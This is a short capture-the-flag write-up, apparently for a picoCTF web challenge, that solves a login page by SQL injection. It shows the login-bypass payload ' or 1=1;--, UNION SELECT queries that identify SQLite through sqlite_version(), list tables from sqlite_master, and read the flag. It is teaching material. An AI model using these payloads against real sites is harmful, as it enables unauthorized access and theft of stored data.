Description
Can you find the flag on this website.
Additional details will be available after launching your challenge instance.
Solution
After start of the instance picoCTF will provide you a link to running instance.
Site has login screen:

If you type user username and user pass - you will get this message.

So now we see the query for login request - it is obviously a hint for us, because when we know the query - we can easily get in with
'or 1=1;-- in pass field:

Because the result query will be something like this:
SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'
We can test some queries to find out, what DB is used, and with this query: 
123' UNION SELECT 1, sqlite_version(), 3;-- 
we now know, that this site is using SQLite.

Now we can just list all tables with this query 
123' UNION SELECT name, sql, null from sqlite_master;--

Here is the flag - let's get it.
123' UNION SELECT flag, null, null from more_table;--
